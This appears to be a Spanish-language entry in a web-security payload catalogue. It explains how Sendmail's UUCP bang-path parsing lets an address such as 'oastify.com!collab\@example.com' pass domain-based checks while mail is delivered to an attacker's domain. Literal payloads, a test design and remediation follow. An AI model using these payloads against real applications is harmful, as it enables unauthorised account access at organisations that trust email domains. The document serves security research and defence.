---
clase: auth
tech: sendmail
cwe: CWE-290
cvss: 7.5 # [derivado] sin CVE; redirige la entrega a un dominio del atacante
payload: |
  # Descubrimiento original (aplicacion no nombrada, mailer Sendmail).
  # LITERAL de la fuente. Notese el backtick: forma parte de la cadena.
  !#$%&'*+\/=?^_`{|}~-collab\@psres.net
  #
  # Forma depurada contra Sendmail 8.15.2, LITERAL de la fuente:
  oastify.com!collab\@example.com
  # -> entrega a oastify.com (dominio de Collaborator) en lugar de example.com
  #
  # Variante extra que la fuente marca como 'works in Postfix':
  "psres.net!collab"(\"@example.com
  # -> correo a collab@psres.net, se envia pese a las comillas.
  # La fuente aclara que esta variante NO es utilizable para bypass de control de acceso.
precondicion: "El mailer interpreta rutas UUCP (bang paths). La mecanica, segun la fuente: la barra invertida ESCAPA la '@', con lo que deja de delimitar el dominio, y entonces la '!' se parsea como separador de bang-path UUCP, que determina el destino real. Mailer confirmado: Sendmail 8.15.2."
como_se_descubre: |
  Señal: el objetivo usa Sendmail. La sonda es la misma del encoded-word (registrar con
  un dominio de Collaborator y observar el RCPT TO), pero el payload cambia: en lugar de
  codificar, se usa '\@' seguido de '!' para redirigir.
  El hallazgo original salio de un FUZZER SMTP escrito por el autor, no de una hipotesis
  previa: la leccion de metodologia es que estos parsers se exploran mejor por fuzzing
  que por lectura de RFC, porque el comportamiento real divergio de la especificacion.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: oastify.com!collab\@example.com   -> entrega al dominio Collaborator (oastify.com)
  # B: collab@example.com                -> entrega a example.com (normal)
  # C: oastify.com!collab@example.com    (SIN la barra invertida)
  #    -> debe entregar a example.com: sin escapar la '@', la '!' no se interpreta
  # El par A/C es el que aisla la causa: la pieza necesaria es la BARRA INVERTIDA,
  # no la '!' por si sola.
mata: |
  - El mailer no interpreta bang paths UUCP -> muere.
  - El parser de la aplicacion rechaza la barra invertida en la parte local.
  - Sendmail actualizado o configurado sin soporte UUCP.
  - El control de acceso no se apoya en el dominio del correo.
fuente: "https://portswigger.net/research/splitting-the-email-atom (Gareth Heyes, 2024-08-07, act. 2025-06-27). Payloads literales de la pagina. La fuente no indica CVE ni recompensa para este caso."
confianza: media
fecha: 2026-11-02
---
# [AUTH] Rutas UUCP (bang path) en Sendmail — `oastify.com!collab\@example.com`

## Principio
Sendmail arrastra soporte para rutas UUCP, una notación de los años ochenta donde
`host!usuario` indica el salto de entrega. Si la `@` deja de delimitar el dominio, la
`!` recupera ese papel. La barra invertida es la que hace el trabajo: escapa la `@`, y
con ella desactivada el parser cae en la interpretación UUCP y entrega al host que
precede a la `!`.

## Payload
El descubrimiento original, literal de la fuente (el backtick forma parte de la cadena):

```
!#$%&'*+\/=?^_`{|}~-collab\@psres.net
```

La forma depurada contra Sendmail 8.15.2:

```
oastify.com!collab\@example.com
```

La aplicación valida una dirección cuyo dominio aparenta ser `example.com`. El mailer
entrega a `oastify.com`, el dominio de Collaborator. Una dirección, dos lecturas.

La fuente añade una variante para Postfix, señalando expresamente que **no** sirve para
bypass de control de acceso:

```
"psres.net!collab"(\"@example.com
```

## Impacto
Verificar la propiedad de una dirección en un dominio que no se controla, con el mismo
techo que el resto de esta familia: entrada a organizaciones cuyo control de acceso se
apoya en el dominio del correo.

## La lección de metodología
Este hallazgo salió de un **fuzzer SMTP** que escribió el autor, no de leer la
especificación. Merece subrayarse porque explica dónde vive esta clase de fallos: en la
distancia entre lo que el RFC dice y lo que décadas de compatibilidad hacia atrás han
dejado en el código. Leer la especificación no habría sugerido que una barra invertida
reactivara una notación de los años ochenta; probar miles de combinaciones sí.

## Remediación
`# [derivado]` para este caso concreto, ya que la fuente da remediación general y no por
payload: deshabilitar el soporte UUCP en la configuración del mailer, y rechazar barras
invertidas en la parte local en la validación de la aplicación. La defensa que de
verdad cierra la clase es la que da la fuente: *"Never use the email domain as a sole
means of authorisation."* Mientras el dominio sea la credencial, cada discrepancia de
parser es una llave.
